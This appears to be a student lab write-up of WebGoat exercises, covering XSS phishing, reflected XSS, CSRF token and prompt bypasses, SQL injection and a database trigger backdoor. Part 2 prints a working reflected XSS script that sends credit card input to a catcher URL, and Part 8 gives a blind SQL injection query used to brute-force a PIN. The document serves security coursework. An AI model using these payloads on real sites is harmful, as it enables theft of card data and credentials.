#Peiqi Hu, 1002263935, peiqi.hu@mail.utoronto.ca
#Jefferson Zhong, 1003946000, jefferson.zhong@mail.utoronto.ca

PART1: Phishing with XSS
	- We exploit XSS vulnerability by injecting HTML code in the
	search bar for which creates a fake login form. Credentials 
	submitted through the form will be uploaded to the hacker's
	server.

PART2: Reflected XSS Attacks
	- scripts
<script>
	hack = function() {
		console.log(document.form.input1.value);
		XssImage = new Image;
		XssImage.src="http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolen-credit-card="
		+ new String(document.form.input1.value)
	}
	document.form.buy.setAttribute('onclick', 'hack()')
</script>
	- unencoded URL: http://localhost:8090/WebGoat/start.mvc#attack/752417971/900?input1=123&input2=<script>hack = function() {console.log(document.form.input1.value);XssImage = new Image;XssImage.src="http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolen-credit-card="+ new String(document.form.input1.value)}document.form.buy.setAttribute('onclick', 'hack()')</script>
			- pass specified value to the input1 and 'scripts'(above) to input2 field
	- We injected onclick function into existing HTML
	element through the "input2" field in the URL. The URL is encoede
	thereafter. The onclick function will upload user credentials
	to the hacker's server when the 'submit' button is clicked.

PART3: Cross Site Request Forgery (CSRF)
	- We injected img element with malicious src attribute into the
	message content. The malicious src exploits the vulnerabilitiy
	of a "transfer" field. When the img element is loaded, it will
	transfer recipient's money with amount specified by "transfer".

PART4: CSRF Prompt By-Pass
	- We injected two iframes with malicious src attributes and a
	script with into the message content. First iframe's src prompts
	a transfer, and the script sets second iframe's url to confirm
	the transfer. Each url exploits the vulnerabilitiy of the
	"transfer" field, for which can specify the amount to be transfer
	or confirm a transfer. 

PART5: CSRF Token By-Pass
	- We injected two iframes with malicious src attributes
	and a script between the two iframes. The first iframe's src starts
	a transfer. Then the script sets the second iframe's src which pass
	the token value taken through onload function. After the script
	sets the url of the second iframe, the second iframe will reload
	and finish the attack to transfer values specified in url.
	(Note: same origin policy)

PART6: String SQL Injection
	- We injected SQL statement through unchecked input. The SQL
	statement always resolve to true, thus will retrieve every
	column from the database.

PART7: Database Backdoors
	- Stage 1:
		Insert SQL statement through unchecked input. The statement
		consists of 2 parts, the regular userid for intended query,
		and extra statement injected for malicious purpose. When
		executed, the statement will set employee salary to 555000.
	- Stage 2:
		Similar to Stage 1, but instead of a malicious UPDATE
		query, a TRIGGER is inserted for which will set all new
		user email to ece568-2020f@utoronto.ca.

PART8: Blind Numeric SQL Injection
	- SQL:
		101 AND EXISTS (SELECT * FROM credit WHERE cc_number=1234123412341234 AND pin = 3318)
	- We injected SQL statement through unchecked input. The 
	statement is a WHERE clause that evaluates a conjunction of two
	conditions. The first condition is known to be true. The second
	condition is existential check on a subquery that fetches rows with
	certain cc_number and pin combo. We did a binary search on pin from
	ranges 1000 to 9999 and end up with 3318 as the pin.
